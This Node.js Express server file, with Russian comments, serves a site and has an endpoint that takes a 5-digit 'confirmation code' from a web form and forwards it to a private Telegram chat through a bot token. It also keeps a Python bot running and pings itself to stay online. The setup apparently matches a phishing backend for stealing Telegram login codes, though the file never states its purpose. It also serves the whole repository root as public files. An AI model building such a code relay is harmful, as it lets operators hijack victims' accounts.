const express = require('express');
const path = require('path');
const { spawn } = require('child_process');
const https = require('https');
const http = require('http');

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 1. Раздаем все статические файлы из КОРНЯ репозитория (без папки public)
app.use(express.static(__dirname));

// 2. Главная страница сайта
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 3. Эндпоинт пинга
app.get('/ping', (req, res) => {
    res.status(200).send('OK');
});

// 4. НАСТРОЙКИ ТЕЛЕГРАМ (Укажи свои данные или используй Environment Variables в Render)
const BOT_TOKEN = process.env.BOT_TOKEN || 'ВАШ_ТОКЕН_БОТА';
const CHAT_ID = process.env.CHAT_ID || 'ВАШ_CHAT_ID';

// 5. ОТПРАВКА 5-ЗНАЧНОГО КОДА В ТЕЛЕГРАМ
app.post('/send-code', (req, res) => {
    const { code } = req.body;
    const cleanCode = code ? code.toString().trim() : '';

    // Валидация: строго 5 цифр
    if (!/^\d{5}$/.test(cleanCode)) {
        return res.status(400).json({ 
            success: false, 
            error: 'Код должен состоять из 5 цифр' 
        });
    }

    console.log(`[SERVER]: Отправка 5-значного кода: ${cleanCode}`);

    const message = encodeURIComponent(`🔑 Получен код подтверждения: ${cleanCode}`);
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;

    https.get(telegramUrl, (apiRes) => {
        let rawData = '';
        apiRes.on('data', chunk => rawData += chunk);

        apiRes.on('end', () => {
            try {
                const response = JSON.parse(rawData);

                // Если Telegram вернул "ok: true"
                if (apiRes.statusCode === 200 && response.ok) {
                    console.log(`[TELEGRAM SUCCESS]: Код ${cleanCode} доставлен!`);
                    return res.json({ success: true, message: 'Код отправлен' });
                } else {
                    console.error(`[TELEGRAM ERROR]:`, response);
                    return res.status(400).json({ 
                        success: false, 
                        error: response.description || 'Неверный токен бота или Chat ID' 
                    });
                }
            } catch (err) {
                console.error(`[PARSE ERROR]:`, err);
                return res.status(500).json({ success: false, error: 'Ошибка ответа Telegram' });
            }
        });
    }).on('error', (err) => {
        console.error(`[NETWORK ERROR]:`, err.message);
        res.status(500).json({ success: false, error: 'Не удалось связаться с Telegram' });
    });
});

// 6. ЗАПУСК И ПЕРЕЗАПУСК PYTHON БОТА
function startTelegramBot() {
    const pythonCmd = process.platform === 'win32' ? 'python' : 'python3';
    console.log(`🚀 Запуск бота: ${pythonCmd} bot.py...`);

    const botProcess = spawn(pythonCmd, ['bot.py']);

    botProcess.stdout.on('data', (data) => console.log(`[BOT]: ${data.toString().trim()}`));
    botProcess.stderr.on('data', (data) => console.error(`[BOT ERROR]: ${data.toString().trim()}`));

    botProcess.on('close', (code) => {
        console.log(`[BOT] Процесс завершен (код ${code}). Перезапуск через 3 сек...`);
        setTimeout(startTelegramBot, 3000);
    });
}

startTelegramBot();

// 7. АВТОПИНГ СЕРВЕРА
const SITE_URL = process.env.RENDER_EXTERNAL_URL;
if (SITE_URL) {
    setInterval(() => {
        const client = SITE_URL.startsWith('https') ? https : http;
        client.get(`${SITE_URL}/ping`, () => {}).on('error', () => {});
    }, 10 * 60 * 1000);
}

// 8. ЗАПУСК ЭКСПРЕСС СЕРВЕРА
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🌐 Сервер запущен на порту ${PORT}`));
